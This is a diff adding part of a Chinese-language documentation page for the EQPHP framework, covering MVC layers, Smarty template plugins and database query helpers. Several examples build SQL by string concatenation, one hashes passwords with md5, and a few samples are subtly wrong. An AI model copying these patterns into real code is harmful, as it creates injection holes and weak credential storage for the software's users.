+                <b class="i48"></b>}<br><br>
+                <b class="i48"></b><i>//清理垃圾</i><br>
+                <b class="i48"></b>function __destruct(){<br>
+                <b class="i72"></b>echo $this->name,'&lt;br&gt;'; <i>//输出demo</i><br>
+                <b class="i72"></b><i>//不能输出de…（提示： Class 'basic' not found）</i><br>
+                <b class="i72"></b>echo basic::cut($this->name,2);<br>
+                <b class="i72"></b>unset($this->name);<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i24"></b>}
+            </code>
+            </span><br><br>
+
+
+            <span>case 4: controller construct<br>
+            <code>
+                <b class="i24"></b>class a_father{<br><br>
+                <b class="i48"></b>protected $father='无名';<br><br>
+                <b class="i48"></b>function __construct(){<br>
+                <b class="i72"></b>$this->father='王五';<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i24"></b>}<br><br><br>
+                <b class="i24"></b>class a_son extends a_father{<br><br>
+                <b class="i48"></b>private $son;<br><br>
+                <b class="i48"></b>function __construct(){<br>
+                <b class="i72"></b>parent::__construct(); <i>//调用父构造函数，以免被重写</i><br>
+                <b class="i72"></b>$this->son='小明';<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i48"></b><i>//输出：小明的父亲是王五</i><br>
+                <b class="i48"></b>function index(){<br>
+                <b class="i72"></b>http::string($this->son.'的父亲是'.$this->father);<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i24"></b>}
+            </code>
+            </span><br><br>
+
+        </div>
+
+
+        <div class="item">
+            <strong>作用意义：</strong><br>
+            <span>1、分离，将php与html（后端和前端）相分离，使得程序更简洁，更易读懂，PHP工程师与前端设计工程师各自同时作业，互不干扰；</span><br>
+            <span>2、包装，将控制器“分发”的 数据 按照用户（浏览者）最能“理解”的样子呈现给用户，结合样式表css更好的包装产品（数据）；</span><br>
+            <span>3、专一，“格式化”数据、收集用户信息（表单）给控制器，为浏览者提供良好视觉界面，使得产品易维护、再开发，进而提升用户体验。</span><br><br>
+
+
+            <strong>视图片段与视图（页面）整合：</strong><br>
+            通常我们所看到的一个页面就是一个完整html文件(dom树)，浏览器渲染的结果是：一小块一小块合成一个页面。如页眉、logo、banner导航条、左栏、中间主体、版权信息等等，甚至更多，这样我们就会发现有些页面的好多地方很相似（甚至相同），若重复的写（或复制粘贴）很浪费时间，也不好维护，这时给代码分块（即视图分块）就显得至关重要了。<br>
+            组件（相似区域）与加载块（相同区域）是我们整合视图时常用的手法。<a href="">案例：view
+            plugin-function</a><br><br>
+
+
+<span>case 1: view plugin-function<br>
+<code>
+
+    <i>&lt;!--组件：网页元信息--&gt;</i><br>
+    {head style='basic|manage' script="jquery|common" module_script="manage"}<br><br>
+
+    <i>&lt;!--代码块：页眉--&gt;</i><br>
+    {include file="{$dir.view}header.html"}<br><br>
+
+    <i>&lt;!--代码块：导航条--&gt;</i><br>
+    {include file="{$dir.view}menu.html"}<br><br><br>
+
+
+    &lt;div class="content"&gt;<br>
+
+    <b class="i24"></b><i>&lt;!--组件：侧边栏主题新闻--&gt;</i><br>
+    <b class="i24"></b>{news_list category="php" amount=10}<br><br>
+
+    <b class="i24"></b>&lt;div class="main"&gt;<br>
+    <b class="i48"></b>本页的主要内容<br>
+    <b class="i48"></b>……<br>
+    <b class="i24"></b>&lt;/div&gt;<br><br>
+
+    &lt;/div&gt;<br><br><br>
+
+    <i>&lt;!--代码块：页脚--&gt;</i><br>
+    {include file="{$dir.view}footer.html"}
+
+</code>
+</span><br><br>
+
+
+            <strong>模板继承（view plugin-block）：</strong><br>
+            大多数时候我们需要一个上(页眉header)下（页脚footer）左（导航菜单sidebar）固定，只变动中间（主体内容main）的布局结构，若每个功能页面都include各个公共块（叶片blade），很显然这种做法就显得重复。模板继承方案正好处理这一缺陷。<br><br>
+
+<span>case 2: view plugin-block<br>
+<code>
+    <i>&lt;!--公共模板：user.html--&gt;</i><br>
+    <i>&lt;!--组件：网页元信息--&gt;</i><br>
+    {head style='basic|user' script="jquery|common|user"}<br><br>
+
+    <i>&lt;!--代码块：页眉--&gt;</i><br>
+    {include file="{$dir.view}header.html"}<br><br>
+
+    <i>&lt;!--代码块：导航条--&gt;</i><br>
+    {include file="{$dir.view}menu.html"}<br><br><br>
+
+
+    &lt;div class="stage"&gt;<br>
+
+    <b class="i24"></b><i>&lt;!--组件：侧边栏主题新闻--&gt;</i><br>
+    <b class="i24"></b>{news_list category="php" amount="10"}<br><br>
+
+    <b class="i24"></b>&lt;div class="main"&gt;<br>
+    <b class="i48"></b>{block name="main"}{/block}<br>
+    <b class="i24"></b>&lt;/div&gt;<br>
+
+    &lt;/div&gt;<br><br><br>
+
+    <i>&lt;!--代码块：页脚--&gt;</i><br>
+    {include file="{$dir.view}footer.html"}<br><br>
+
+    <i>**************************************************</i><br><br>
+
+    <i>&lt;!--详细功能页面：follow.html--&gt;</i><br>
+    {extends file="user/layout/user.html"}<br><br>
+
+    {block name="main"}<br>
+    <b class="i24"></b>&lt;div
+    class="follow"&gt;亲，这里才是主战场，尽情表现吧！&lt;/div&gt;<br>
+    {/block}
+
+</code></span><br><br>
+
+        </div>
+
+
+        <div class="item">
+<strong>模型：</strong><br>
+通常我们会碰到：数据库一张表（关系比较复杂的表）若有变动，我们就得逐一扫描所有程序并修改与这张表相关的地方，变动稍大，修改、测试工作量大的要命。还有，你是不是常常发现我们项目的安全问题往往出在数据库上，比如，由于验证不力让人恶意写入危险字符，数据库爆满、数据泄露等等。你可能会问这与模型有和关系呢？当然有，调查发现：未采用MVC的模式项目通常易被攻击，想想看，把所有的事情混在一起，让大伙都来干预，这样是不是容易出现纰漏。<br>
+鉴于上述，模型就显得至关重要了。你可能已经理解了：模型就数据模型，就是建立在控制器与数据库之间的一个关系层。用来隔离控制层直接与数据库打交道，保证数据安全出入（CURD）数据库，维持资源的调度与程序的稳定性。<br><br>
+
+
+<strong>EQPHP如何创建一个模型类？</strong><br>
+很简单，我们只需要创建一个m_模型名的php文件，且内容是一个m_模型名的类，然后放入相应分组（模块）的model里就OK了，如下，案例：model<br>
+case:model<br>
+<code>
+
+    <i>/**<br>
+        【news】新闻数据模型<br>
+        1、获取指定数目的新闻<br>
+        2、获取指定新闻详情<br>
+        3、删除指定新闻<br>
+        4、添加新闻<br>
+        5、修改指定新闻<br>
+        **/</i><br><br>
+
+
+    class m_news{<br><br>
+
+
+    <b class="i24"></b>const NEWS='news';<br><br>
+
+<b class="i24"></b><i>//获取指定数目的新闻</i><br>
+<b class="i24"></b>static function fetch($mode=false,$num=10){<br>
+<b class="i48"></b>$option['select']='id,title,pub_time';<br>
+<b class="i48"></b>$option['from']=self::NEWS;<br>
+<b class="i48"></b>$option['where']='is_show=1';<br>
+<b class="i48"></b>$option['order']=$mode ? 'visited_num desc id desc' : 'id desc';<br>
+<b class="i48"></b>$option['limit']='0,'.$num;<br>
+<b class="i48"></b>return db::batch(sql($option));<br>
+<b class="i24"></b>}<br><br>
+
+<b class="i24"></b><i>//获取指定新闻详情</i><br>
+<b class="i24"></b>static function get($news_id){<br>
+<b class="i48"></b>$select='id,title,description,content,pub_time,visited_num';<br>
+<b class="i48"></b>$condition='is_show=1 &&'.$news_id;<br>
+<b class="i48"></b>return db::get(sql($select,self::NEWS,$condition));<br>
+<b class="i24"></b>}<br><br>
+
+
+<b class="i24"></b><i>//删除新闻</i><br>
+<b class="i24"></b>static function delete($news_id){<br>
+<b class="i48"></b>if (strpos($news_id,',')) {<br>
+<b class="i72"></b>$news_id='id in('.$news_id.')';<br>
+<b class="i48"></b>}<br>
+<b class="i48"></b>return db::delete(self::NEWS,$news_id);<br>
+<b class="i24"></b>}<br><br>
+
+<b class="i24"></b><i>//添加新闻</i><br>
+<b class="i24"></b>static function post($data){<br>
+<b class="i48"></b>return db::post(self::NEWS,$data);<br>
+<b class="i24"></b>}<br><br>
+
+<b class="i24"></b><i>//修改新闻</i><br>
+<b class="i24"></b>static function patch($data){<br>
+<b class="i48"></b>if (isset($data['news_id'])) {<br>
+<b class="i72"></b>$news_id=$data['news_id'];<br>
+<b class="i72"></b>unset($data['news_id']);<br>
+<b class="i72"></b>return db::patch(self::NEWS,$data,$news_id);<br>
+<b class="i48"></b>}<br>
+<b class="i24"></b>}<br><br>
+
+}
+
+
+</code><br><br>
+
+
+<strong>业务逻辑：</strong><br>
+开发中我们经常会遇到一大堆与数据库没有关系、与控制器没有关系的逻辑算法，比如对数据记录排序、计算统计结果等等。<br>
+对业务逻辑层，EQPHP推荐以下几种场景可以考虑：<br>
+a、需要跨模块（分组）调用的数据模型（如访问统计）可写在业务逻辑层；<br>
+b、纯数据计算、数据转换；<br>
+c、全局使用的业务逻辑代码，如登录验证；<br>
+d、似组件，但做成组件不好使用，如分页导航条。<br><br>
+
+
+<strong>EQPHP如何创建一个业务逻辑类？</strong><br>
+创建一个s_业务名的php文件，且内容是一个s_业务名的类，然后放入相应server里就OK了，如下，案例：server<br>
+case:model<br>
+<code>
+
+
+
+    class s_trade{<br><br>
+    <b class="i24"></b><i>//定义模块所涉及表</i><br>
+    <b class="i24"></b>const TABLE_TRADE = 'user_trade';<br>
+    <b class="i24"></b>const TABLE_PREPAY_PROCESS = 'prepay_process';<br>
+    <b class="i24"></b>const TABLE_PREPAY_RECORD = 'prepay_record';<br>
+    <b class="i24"></b>const TABLE_WITHDRAW_PROCESS = 'withdraw_process';<br>
+    <b class="i24"></b>const TABLE_WITHDRAW_RECORD = 'withdraw_record';<br><br>
+
+    <b class="i24"></b>static function is_init($user_id){<br>
+    <b class="i48"></b>return (bool)db::field(self::TABLE_TRADE, 'password', compact('user_id'));<br>
+    <b class="i24"></b>}<br><br>
+
+    <b class="i24"></b>static function is_allow($user_id, $field){<br>
+    <b class="i48"></b>return (bool)db::field(self::TABLE_TRADE, $field, compact('user_id'));<br>
+    <b class="i24"></b>}<br><br>
+
+    <b class="i24"></b>static function update_password($password, $user_id){<br>
+    <b class="i48"></b>$data['salt'] = secure::salt();<br>
+    <b class="i48"></b>$data['password'] = md5($password . $user_id . $data['salt']);<br>
+    <b class="i48"></b>$data['user_id'] = $condition['user_id'] = $user_id;<br>
+    <b class="i48"></b>return db::put(self::TABLE_TRADE, $data, $condition);<br>
+    <b class="i24"></b>}<br><br>
+
+
+}<br>
+
+</code><br><br>
+
+
+<strong>总结分析：</strong><br>
+1、模型与业务呈阴阳，功能调度互补，模型主私、处理局部(模块分组)，业务主公、掌控全局；<br>
+2、模型紧紧与数据库打交道，业务逻辑只有一个，可替代模型；<br>
+3、两者在实际开发中均可不用（看实际情况，很免强）。
+</div>
+
+
+
+
+<div class="item">
+<strong>什么是组件？</strong><br>
+组件，也称插件，即能够独立完成某项特定功能的程序体。EQPHP将组件分为动态组件（需要PHP程序支持）和静态组件（即前端插件），如天气预报组件、财经指数组件、日历插件等等。<br>
+EQPHP目前使用开源smarty模板引擎整合视图，将smarty组件用法进行扩展，使其与整个框架相融合。常用组件有：function、modify、block三项。<br><br>
+
+<strong>应用场景：</strong><br>
+a、系统项目中孤立（或多处使用）单元（不受系统或周围环境的影响），如导航条、页脚等；<br>
+b、经常性使用的功能代码，如消息发送时间加工器、颜色选择器、文件上传面板等；<br>
+c、记录集循环输出中某项数据加工修饰，如工资清单中根据职位不同显示不同颜色，以便区分。<br><br>
+
+<strong>使用模式：</strong><br>
+1、系统全局组件，plugin目录下（p_functionPlugin.php、p_modifierPlugin.php文件中定义即可）；<br>
+2、分组组件，每个分组下可设plugin目录，内放分组组件，如news分组下的p_function.php、p_modifier.php<br><br>
+
+<strong>分组组件使用方法：</strong><br>
+step 1、创建组件：建一个p_组件名的php文件，且内容是一个p_组件名的类，然后放入plugin目录；<br>
+step 2、注册组件：到配置目录找到系统配置文件blog/config/plugin.php，打开找到组件配置项，根据组件类型将组件名添加到响应项；<br>
+step 3、组件模板：到视图目录制作组件数据样式模板，即html代码片段；<br>
+step 4、调用组件：到目标视图使用smarty组件调用方法调用。<a href="">案例：case plugin</a><br><br>
+case plugin(p_menu.php)<br>
+<code>
+
+
+<i>
+/**<br>
+【菜单】function组件<br>
+1、导航条<br>
+2、二级导航面板<br>
+3、页脚帮组导航<br>
+**/</i><br><br>
+
+class p_menu{<br><br>
+
+<b class="i24"></b><i>//项目导航条</i><br>
+<b class="i24"></b>static function top_nav($params,$tpl){<br>
+<b class="i48"></b>$data['now_category']=isset($params['now_category']) ? <br>
+<b class="i72"></b>$params['now_category'] : 'index';<br>
+<b class="i48"></b>$data['category']=config('menu.top_nav');<br>
+<b class="i48"></b>return smarty3::show('plugin/top_nav',$data,$tpl);<br>
+<b class="i24"></b>}<br><br>
+
+<b class="i24"></b><i>//二级导航面板</i><br>
+<b class="i24"></b>static function left_menu($params,$tpl){<br>
+<b class="i48"></b>$category=isset($params['category']) ?<br>
+    <b class="i72"></b> $params['category'] : 'index';<br>
+<b class="i48"></b>$data['info']=config('left_menu.'.$category);<br>
+<b class="i48"></b>return smarty3::show('plugin/left_menu',$data,$tpl);<br>
+<b class="i24"></b>}<br><br>
+
+<b class="i24"></b><i>//页脚帮助导航</i><br>
+<b class="i24"></b>static function help_menu($params,$tpl){<br>
+<b class="i48"></b>$data['now_option']=isset($params['now_option']) ?<br>
+    <b class="i72"></b> $params['now_option'] : 'contact';<br>
+<b class="i48"></b>$data['option']=config('menu.help_menu');<br>
+<b class="i48"></b>return smarty3::show('plugin/help_menu',$data,$tpl);<br>
+<b class="i24"></b>}<br><br>
+
+
+}<br>
+
+</code><br><br>
+
+config.ini<br>
+<code>
+……<br><br>
+[plugin]<br>
+function=p_fun,p_page<br>
+modifier=p_mod,<span class="fcr">p_menu</span><br>
+<i>; block=p_block</i><br><br>
+
+……<br>
+</code><br><br>
+
+
+menu.ini<br>
+<code>
+[top_nav]<br>
+index=首页<br>
+about=关于我们<br>
+product=产品展示<br>
+server=服务项目<br>
+news=新闻资讯<br>
+contact=联系方式<br><br>
+
+
+[help_menu]<br>
+contact=联系方式<br>
+help=使用指南<br>
+site_map=网站地图<br>
+job=招贤纳士<br>
+weibo=官方微博<br>
+message=留言建议<br>
+
+</code><br><br>
+
+top_nav.html<br>
+<code>
+&lt;div class="top_nav"&gt;<br>
+&lt;ol&gt;{foreach key=option item=name from=$category}<br>
+&lt;li{if $now_category eq $name} class="now_option"{/if}>&lt;a href="{$url}{$option}"&gt;{$name}&lt;/a&gt;&lt;/li&gt;<br>
+{/foreach}&lt;/ol&gt;<br>
+&lt;/div&gt;<br>
+</code><br><br>
+
+news.html<br>
+<code>
+……<br><br>
+<i>&lt;!--调用导航组件--&gt;</i><br>
+{top_nav now_category="news"}<br><br>
+……
+</code><br>
+
+<strong class="fcy1">Tip：</strong>组件类的对外（即视图中需要调用的）方法必须为全局、静态（即public static）性质。<br>
+
+</div>
+
+<div class="item">
+<strong>工具类（library）</strong><br>
+做为项目开发中最小的数据加工、逻辑处理单元，工具类作用意义重大：<br>
+1、层级最高，在哪儿都可以被调用，使用简单方便；<br>
+2、可重复使用，不受环境影响，极大简化代码结构，使代码简洁易读；<br>
+3、根据项目需求，可增可减，扩展性强。<br>
+EQPHP将常用的函数方法根据其使用范畴采用单例、静态类（纯静态方法集合）、普通类等方式收集整合归类：如文件缓存类、数据库操作类、性能调试类、<br>
+表单处理类、数组字符处理类、安全过滤类、请求响应类、邮件类、模板引擎类、文件类、日志类、图片处理类、session/cookie类…
+<br><br>
+
+<strong>使用方法：</strong><br>
+1、作用域调用法（静态方法），如删除指定目录：<span class="fsb">file::delete($file_dir)</span>，查询一个字段：<span class="fsb">db::field('member','email',8)</span>；<br>
+2、对象标识符调用法，如多库查询：<span class="fsb">db('master')->batch(sql($option))</span>；<br>
+3、常规使用方法：<span class="fsb">$cache->save($data)</span>。更多更具体用法参见：<a href="">速查手册 工具类一览表</a><br><br><br>
+
+
+<strong>快捷函数（shortcut）</strong><br>
+快捷函数shortcut.php位于library目录下（当然你也可以将其移至你认为合理的地方），其存在意义：<br>
+1、有些方法使用频率及其高，如：配置读取、SQL语句组装等，为了更方便的使用，将其写入函数方法包；<br>
+2、从性能考虑，出于最少最快加载，将其写入函数方法包，如：获取pathinfo路由的参数。<br>
+EQPHP不建议大量使用快捷函数，考虑整个项目的开发、性能，请酌情使用。
+</div>
+
+<div class="item">
+<strong>单库操作</strong><br>
+
+一、数据库连接配置，打开config/local/db.php文件，配置如下：<br>
+<code>
+    
+    return [<br>
+    <b class="i24"></b>'server'=>[<br>
+    <b class="i48"></b>'host'=>'localhost',<br>
+    <b class="i48"></b>'port'=>3306,<br>
+    <b class="i48"></b>'user'=>'root',<br>
+    <b class="i48"></b>'password'=>'',<br>
+    <b class="i48"></b>'database'=>'eqphp_0929',<br>
+    <b class="i48"></b>'charset'=>'utf8',<br>
+    <b class="i24"></b>],<br>
+    ];
+</code><br><br>
+
+二、数据记录操作（CURD-read）-查询<br>
+1、执行SQL语句：<span class="fsb">db::query('SQL语句')</span><br>
+<code>
+<i>//删除所有会员信息：</i><br>
+db::query('delete from member');<br><br>
+
+<i>//所有会员增加2个积分：</i><br>
+db::query('update member set point = piont + 2');<br><br>
+
+<i>//清空会员表（自增主键归0）：</i><br>
+db::query('truncate member');<br><br>
+
+<i>//删除临时访问日志表：</i><br>
+db::query('drop table visited_log');
+</code><br><br>
+
+2、查询数据表指定字段值(点，返回一个单元格)：<span class="fsb">db::filed('表名','查询字段','条件')</span><br>
+<code>
+<i>//查询ID为8的新闻标题：</i><br>
+echo db::field('news','title',8); <i>//输出：EQPHP本周用户关注度大幅提升</i><br><br>
+
+<i>//查询用户账号为tom的邮箱：</i><br>
+echo db::field('member','email','account="tom"'); <i>//输出：tom88@tom.com</i><br><br>
+
+<i>//查询ID为10的帖子回复总数：</i><br>
+echo db::field('bbs_reply','count(1)','subject_id=10'); <i>//输出：51</i>
+</code><br><br>
+
+3、查询数据表指定记录(线，返回一行)：<span class="fsb">db::get('查询SQL语句')</span><br>
+<code>
+<i>//查询ID为32的会员基本信息：</i><br>
+$query_field='nickname,age,address,sign';<br>
+$user_info=db::get(sql($query_field,'member','user_id=32'));<br>
+print_r($user_info);<br>
+<i>//输出结果：[ [nickname] => EQPHP [age] => 26 [address] => 古城长安 [sign] => EQPHP,一个神级框架！ ]</i>
+</code><br><br>
+
+4、查询数据表多条记录(面，返回多行)：<span class="fsb">db::batch('查询SQL语句')</span><br>
+<code>
+<i>//查询年龄大于30岁的前20位女性会员的基本信息并按年龄降序排列：</i><br>
+$option['select']='nickname,age,address,sign';<br>
+$option['from']='user_info';<br>
+$option['where']='sex=2 && age>30';<br>
+$option['order']='age desc';<br>
+$option['limit']='0,20';<br>
+$user_info=db::batch(sql($option));<br>
+var_dump($user_info);<br>
+<i>//输出结果：<br>
+[2] {<br>
+[0]=> [5] { ["nickname"]=> string(5) "樱桃小妞" ["age"]=> int(36) ["address"]=> string(12) "古城长安" ["sign"]=> string(27) "只爱你" }<br>
+[1]=> [5] { ["nickname"]=> string(5) "mary" ["age"]=> int(31) ["address"]=> string(12) "北京王府井" ["sign"]=> string(27) "我就是一个吃货" }<br>
+}</i>
+</code><br><br>
+
+5、分页查询(体，分批返回)：<span class="fsb">db::page('查询SQL语句','记录总数','页码','每页记录数')</span><br>
+<code>
+<i>//分页查询新闻列表：</i><br>
+$option['select']='id,title,visited_num,pub_time';<br>
+$option['from']='news';<br>
+$option['where']='is_show=1';<br>
+$option['order']='pub_time desc';<br><br>
+
+$rs_count=db::field('news','count(1)',$option['where']);<br>
+$news_list=db::page(sql($option),$rs_count,url(3,1),20);<br>
+out($news_list[1],1);<br>
+
+
+<i>//输出结果：<br>
+[<br>
+　　[0] => [<br>
+　　　　　　[id] => 74<br>
+　　　　　　[title] => PHP开源MVC框架：EQPHP V1.0版本上线发布<br>
+　　　　　　[visited_num] => 1237<br>
+　　　　　　[pub_time] => 2013-10-24<br>
+　　　　]<br><br>
+
+　　[1] => [<br>
+　　　　　　[id] => 69<br>
+　　　　　　[title] => 关于mysql数据库分布式事务处理方案<br>
+　　　　　　[visited_num] => 891<br>
+　　　　　　[pub_time] => 2013-10-22<br>
+　　　　]<br><br>
+
+)<br></i>
+</code><br><br>
+
+三、数据记录操作（CURD-create/update/delete）-增加、修改、删除<br>
+1、添加数据记录：<span class="fsb">db::post('表名','数据{字段=>值}')</span><br>
+<code>
+<i>//添加一条新闻：</i><br>
+$data['title']='PHP开源MVC框架：EQPHP V1.0版本上线发布';<br>
+$data['summary']='PHP开源MVC框架EQPHP,一个神级框架！';<br>
+$data['author']='admin';<br>
+$data['content']='PHP开源MVC框架：EQPHP V1.0版本上线发布,欢迎下载使用，求建议、求改进！';<br>
+db::post('news',$data);<br><br>
+
+<i>//添加2名同学的考试成绩：</i><br>
+$field='(name,math,english,art,geography,physics,chemistry)';<br>
+$data=['("tom",98,100,86,75,85,68)','("lily",100,90,76,65,75,68)'];<br>
+db::post('user_score',$field,$data);<br><br>
+
+<i>//生成3张优惠券：</i><br>
+$data=[<br>
+    ['coupon_no'=>'3642829942','money'=>2000],<br>
+    ['coupon_no'=>'1299221400','money'=>2000],<br>
+    ['coupon_no'=>'5112290876','money'=>2000],<br>
+    ];<br>
+db::post('coupon',$data);<br>
+</code><br><br>
+
+2、修改数据记录：<span class="fsb">db::patch('表名','数据(字段=>值)','条件')</span><br>
+<code>
+<i>//修改ID为8的会员邮箱、电话、QQ号：</i><br>
+$data['email']='example@126.com';<br>
+$data['phone']='13654128***';<br>
+$data['qq']='456987213';<br>
+db::patch('member',$data,8);<br><br>
+
+<i>//将工龄满5的女员工薪资加两成：</i><br>
+db::patch('staff','salary=salary*1.2','sex=2 && work_years>=5');<br>
+</code><br><br>
+
+3、删除数据记录：<span class="fsb">db::delete('表名','条件')</span><br>
+<code>
+<i>//删除ID为8的会员：</i><br>
+db::delete('member',8);<br><br>
+
+<i>//删除选中新闻：</i><br>
+db::delete('news','id in(15,36,77,162,201)');<br>
+</code><br><br>
+
+
+四、事务操作（transaction）<br>
+如若你的数据引擎(如mysql的innodb)支持事务，你可以如下使用：<br>
+<code>
+try{<br>
+<b class="i24"></b><i>//开启事务</i><br>
+<b class="i24"></b>db::query('begin');<br>
+
+<b class="i24"></b><i>//执行sql语句</i><br>
+<b class="i24"></b>db::post('news',$data);<br>
+<b class="i24"></b>$account=db::field('member','account',8);<br>
+<b class="i24"></b>db::batch(sql('news','id,title,author,pub_time','author='.$account));<br><br>
+<b class="i24"></b><i>//提交事务</i><br>
+<b class="i24"></b>db::transaction('commit');<br>
+}catch(Exception $e){<br>
+<b class="i24"></b><i>//回滚事务</i><br>
+<b class="i24"></b>db::transaction('rollback');<br>
+<b class="i24"></b>throw new mException($e->getMessage(),10001);<br>
+}<br>
+</code><br><br>
+
+
+五、构造SQL查询语句（SQL action）<br>
+写出性能高效、可读性好、易维护又安全的SQL语句是大多数开发者不断追求的。然而，查询的多样性是的SQL语句千变万化，难有定律。<br>
+EQPHP推荐使用多SQL（分步查询）+事务方式（将数据处理、整合留给php做，mysql只负责“拿”）代替复杂的联合查询。 SQL组装函数：db::sql($option,$from,$where)可以我们日常开发中80%左右的SQL查询，用法有如下两种方式：<br><br>
+
+
+1、字符串参数：<span class="fsb">db::sql('查询字段','表名','条件')</span><br>
+<code>
+<i>//组装：select id,subject,info from bbs_subject where user_id=8</i><br>
+db::sql('id,subject,info','bbs_subject','user_id='.session('id'));<br><br>
+
+<i>//组装：select id,title,summary,content,pub_time from news</i><br>
+db::sql('id,title,summary,content,pub_time','news');<br>
+</code><br><br>
+
+1、数组参数：<span class="fsb">db::sql($option)</span>数组的键：select/from/where/group/having/order/limit<br>
+<code>
+<i>//组装：select is_sure,count(id) as num from c_event where is_show=1 && company_id=12 group by is_sure</i><br>
+$option['select']='is_sure,count(id) as num';<br>
+$option['from']='c_event';<br>
+$option['where']='is_show=1 && company_id=12';<br>
+$option['group']='is_sure';<br>
+db::sql($option);<br><br>
+
+
+
+<i>//组装：select name,sum(sale) as sale_num from store_info where city_id in(1,15,31,52,47,21) group by name having sale_num>1500</i><br>
+$option['select']='name,sum(sale) as sale_num';<br>
+$option['from']='store_info';<br>
+$option['where']='city_id in(1,15,31,52,47,21)';<br>
+$option['group']='name';<br>
+$option['having']='sale_num>1500';<br>
+db::sql($option);<br>
+</code><br><br>
+
+
+
+<strong>六、构造SQL条件（Condition）:</strong><br>
+1、连接逻辑(logic)、追加字符串SQL(query/native/string)
+<code>
+$condition['name'] = 'EQPHP';<br>
+$condition['status'] = 1;<br>
+query::condition($condition); <i>//输出SQL条件</i><br>
+<i>//(name="EQPHP") and (status=1)</i><br><br>
+
+$condition['logic'] = 'or'; <i>//改变连接逻辑符</i><br>
+<i>//(name="EQPHP") or (status=1)</i><br><br>
+
+$condition['query'] = 'sex="male" and age>25'; <i>//字符SQL</i><br>
+<i>//(sex="male" and age>25) or (name="EQPHP") or (status=1)</i>
+</code><br>
+
+2、基本查询条件表达式(eq/neq/gt/egt/lt/elt)
+<code>
+$condition['name'] = ['eq','EQPHP'];<br>
+$condition['level'] = ['egt',3];<br>
+<i>//(name="EQPHP") and (level>=3)</i>
+</code><br>
+
+3、in范围查找(in/not in)
+<code>
+$condition['id'] = ['in',[1,2,3,6]];<br>
+$condition['grade'] = ['not in','1,6'];<br>
+<i>//(id in(1,2,3,6)) and (grade not in(1,6))</i><br>
+</code><br>
+
+4、between区间查找(between/not between)
+<code>
+$condition['age'] = ['between',[25,45]];<br>
+<i>//(age between 25 and 45)</i>
+</code><br>
+
+5、like模糊匹配(like/not like)
+<code>
+$condition['title'] = ['like','%小明%'];<br>
+<i>//(name title "%小明%")</i><br><br>
+
+$condition['tag|description'] = ['like','%小明%'];<br>
+<i>//(name like "%小明%") and ((tag like "%小明%") or (description like "%小明%"))</i><br><br>
+
+$option['name&nick_name&real_name']=['like','%小明%'];<br>
+<i>//((name like "%小明%") and (nick_name like "%小明%") and (real_name like "%小明%"))</i><br><br>
+
+$like['name']=['like',['%EQPHP','eqphp%'],'or'];<br>
+<i>//(name like "%EQPHP" or name like "eqphp%")</i>
+</code><br>
+
+6、interval数学区间查询(1,9)/[2,3)
+<code>
+$condition['age'] = ['interval','[25,55]'];<br>
+<i>//(age>=25 && age<=55)</i><br><br>
+
+$condition['score'] = ['interval','[60,75)'];<br>
+<i>//(score>=60 && score<75)</i><br><br>
+
+$condition['logic'] = 'or';<br>
+$condition['age'] = ['interval','[25,55]'];<br>
+$condition['score'] = ['interval','[60,75)'];<br>
+<i>//(age>=25 and age<=55) or (score>=60 and score<75)</i>
+</code><br>
+
+7、多字段简洁组合查询
+<code>
+    $condition['park_phone|pick_phone'] = '15001568***';<br>
+    <i>//((park_phone = '15001568***') or (pick_phone = '15001568***'))</i><br><br>
+
+    $condition['park_phone&pick_phone'] = '15001568***';<br>
+    <i>//((park_phone="15001568***") and (pick_phone="15001568***"))</i><br><br>
+
+    $condition['order_id,client_id,bill_id'] = [12,44,89,'or'];<br>
+    <i>//(order_id=12) or (client_id=44) or (bill_id=89)</i>
+</code><br><br>
+
+
+
+<strong>七、连贯操作：</strong>
+
+query('表名')->select('字段')->where('条件')<br>
+　　　　　　 ->join('表名,条件'[,'模式'])<br>
+　　　　　　 ->group('分组')->having('条件')->order('排序')<br>
+　　　　　　 ->limit('数量')->out('结果模式')<br><br>
+
+    <table class="manual">
+        <tr><th width="60px">&nbsp;</th><th width="120px">参数类型</th><th>解释案例</th></tr>
+        <tr><td>select</td><td>string</td><td>查询字段，如：'name,age,sex'</td></tr>
+        <tr><td>where</td><td>string/array</td><td>条件，如：['id'=>8,'age'=>['interval','[25,45]']]<br>
+            或：'id = 8 and age &gt;= 25 and age &lt;= 45'</td></tr>
+        <tr><td>join</td><td>string,array</td><td>连表查询，如：['user_profile'=>'user_id = user.id']<br>模式：left/right/inner/outer</td></tr>
+        <tr><td>group</td><td>string</td><td>分组，如：'sex,age'</td></tr>
+        <tr><td>having</td><td>string</td><td>聚合条件，如：'avg(score) &gt;= 60'</td></tr>
+        <tr><td>order</td><td>string</td><td>排序，如：'register_time desc, id asc'</td></tr>
+        <tr><td>limit</td><td>string</td><td>记录集区间，如：'10.50'或20</td></tr>
+        <tr><td>out</td><td>string</td><td>返回类型，默认为：sql<br>
+            有：sql,SQL语句；record,一条记录；batch,一批记录<br>
+            page,分页返回(page,记录数,当前页码,每页记录数)</td></tr>
+    </table><br><br>
+
+1、查看SQL语句<br>
+<code>
+query('user_profile')->select('nickname,age,address,sign')->where('user_id=32')->out('sql');<br>
+<i>//输出：select nickname,age,address,sign from user_profile where user_id=32</i>
+</code><br>
+
+2、查询用户ID为8的用户信息<br>
+<code>
+query('user')->select('avatar,nick_name,sign')->where(['user_id'=>8])->out('record');<br>
+<i>//输出结果：[ [avatar] =&gt; member.png [nick_name] =&gt; EQPHP [sign] =&gt; EQPHP,一个神级框架！ ]</i>
+</code><br>
+
+3、查询18~30岁之间前2位姓王的女性会员的基本信息并按年龄降序排列：<br>
+<code>
+$condition['sex']='female';<br>
+$condition['age']=['interval','[18,30)'];<br>
+$condition['real_name|full_name']=['like','%王'];<br><br>
+query('user_info')-&gt; select('real_name,full_name,age,address,sign')-&gt; where($condition)<br>
+-&gt; order('age desc')-&gt; limit(2)-&gt; out('batch')<br>
+<i>//输出结果：<br>
+[["real_name"=> "王樱桃","full_name"=>'',"age"=>26,"sign" => "只爱你"],<br>
+["real_name"=> "","full_name"=>'王明',"age"=>22,"sign" => "我就是一个吃货"]]<br>
+</i>
+</code><br>
+
+4、分页查询新闻列表：<br>
+<code>
+$condition='is_show=1';<br>
+$rs_count=db::field('news','count(1)',$condition);<br><br>
+query('news')->select('id,title,visited_num,pub_time')->where($condition)<br>
+->order('pub_time desc')->out('page',$rs_count,2,20);<br>
+<i>//输出结果：<br>
+[<br>
+　　[0] =&gt; [<br>
